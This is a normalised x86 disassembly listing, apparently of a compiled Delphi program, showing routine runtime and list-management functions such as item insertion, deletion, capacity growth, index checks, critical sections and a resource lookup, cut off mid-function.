mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416044
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4161a0
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41554a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_415570
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4155a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_415350
xor edx edx
push ebp
push sub_415617
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_415408
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403f38
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4161a0
mov edx [ ebp - 0x4 ]
call sub_414e2c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415634
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415694
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41569b
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_4156a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_4156e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4151b4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4156ed
mov eax [ rw-data ]
call sub_415408
retn
sub_4156f4
push ebx
push esi
mov esi eax
mov eax esi
call sub_4156a0
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_415634
sub_415714
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_415779
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_415374
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41535c
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415780
mov eax [ rw-data ]
call sub_415408
retn
mov eax ebx
call sub_40364c
mov ebx eax
sub_415784
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_4157c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_415414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4157cd
mov eax [ rw-data ]
call sub_415408
retn
sub_4157d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_415812
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4153b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415819
mov eax [ rw-data ]
call sub_415408
retn
sub_41581c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_415863
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_415288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41586a
mov eax [ rw-data ]
call sub_415408
retn
sub_415870
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415350
xor eax eax
push ebp
push sub_4158be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_415054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4158c5
mov eax [ rw-data ]
call sub_415408
retn
sub_415924
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403a24
pop ebp
retn 0x8
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_41595c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415924
mov edx eax
mov eax [ rw-data ]
call sub_4167ac
pop edi
pop esi
pop ebx
retn
sub_415988
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416834
mov esi eax
xor edx edx
push ebp
push sub_4159f2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
mov edx ebx
mov eax esi
call sub_4161a0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403f38
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415a04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416834
mov esi eax
xor edx edx
push ebp
push sub_415a6e
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416898
retn
mov edx ebx
mov eax esi
call sub_4161a0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403f38
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415a80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_40873c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415ac0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_404480
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_415b04
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4161fc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_416044
sub_415b5c
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4161a0
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_415b9c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_415b5c
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_415bc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4048dc
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419114
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415c34
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_418c70
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_415c44
push ebx
call sub_4067f8
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_4067f8
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_416044
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov ebx eax
call sub_4067f8
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov ebx eax
call sub_4067f8
mov [ eax + 0xc ] ebx
sub_415c9c
push ebx
push esi
push edi
call sub_4067f8
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4161a0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_415ccc
push ebx
push esi
call sub_4067f8
mov eax [ eax + 0x8 ]
call sub_4036c0
call sub_4067f8
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_416288
mov esi eax
call sub_4067f8
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_416090
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_4067f8
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4036c0
sub_415d28
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_415dbe
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415dc5
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40364c
call sub_415d28
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403610
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404688
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405b40
call sub_405b90
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_415bc0
or bl al
sub_415dd0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_40d7e4
xor eax eax
push ebp
push sub_415e7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_415e5f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403608
call sub_415d28
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_415c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e66
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_415c9c
retn
call sub_415ccc
sub_415e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_415ef1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41c1f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ef8
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_415f00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_403608
push eax
mov eax esi
call sub_403608
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_4171e4
push eax
mov eax esi
call sub_4171e4
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416010
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_415e94
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415ff3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_415e94
mov eax [ ebp - 0x8 ]
call sub_418914
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_418914
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_418914
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4086c8
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ffa
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
mov al 0x1
sub_416024
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_416044
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416090
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028fc
mov edx esi
mov eax ebx
call sub_4161a0
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4160f4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4160f0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
jmp sub_403e8c
sub_41612c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_416174
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_406660
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4160f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41617b
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_4161a0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4161c8
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_416360
retn
sub_4161fc
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41621c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028fc
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416294
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4161a0
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_416090
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41621c
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4162ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_416340
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4161fc
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416090
sub_416360
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402784
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41639c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41612c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_416360
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402fc4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_416090
dec ebp
inc edi
jne r-xdata
sub_416410
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
mov edi eax
push 0x0
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_416410
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_416450 ]
xor eax eax
mov al bl
cmp eax 0x5
ja r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ edi + 0xc ]
mov eax esi
call sub_416360
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41660a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_416360
mov eax [ edi + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4166ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_416360
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4161a0
mov edx eax
mov eax edi
call sub_4161fc
inc eax
jne r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax esi
call sub_4161a0
mov edx eax
mov eax edi
call sub_4161fc
inc eax
je r-xdata
push 0x0
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416410
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax esi
call sub_4161fc
inc eax
jne r-xdata
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax esi
call sub_416044
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_416090
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax esi
call sub_416044
mov ebx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
add ebx [ eax + 0x8 ]
cmp ebx [ esi + 0xc ]
jle r-xdata
mov edx ebx
mov eax esi
call sub_4161a0
mov edx eax
mov eax edi
call sub_4161fc
inc eax
je r-xdata
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_416044
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_416090
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_416044
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax esi
call sub_4161fc
inc eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx ebx
mov eax esi
call sub_416360
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax esi
call sub_416090
mov edx ebx
mov eax edi
call sub_4161a0
mov edx eax
mov eax esi
call sub_4161fc
inc eax
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
inc eax
mov [ ebp - 0xc ] eax
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4161a0
mov edx eax
mov eax esi
call sub_416044
inc ebx
dec [ ebp - 0xc ]
jne r-xdata
sub_4166dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_416730
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403a8c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416834
xor eax eax
push ebp
push sub_416792
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4036c0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4036b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416799
mov eax [ ebp - 0x4 ]
call sub_416898
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4167ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_416834
xor eax eax
push ebp
push sub_416828
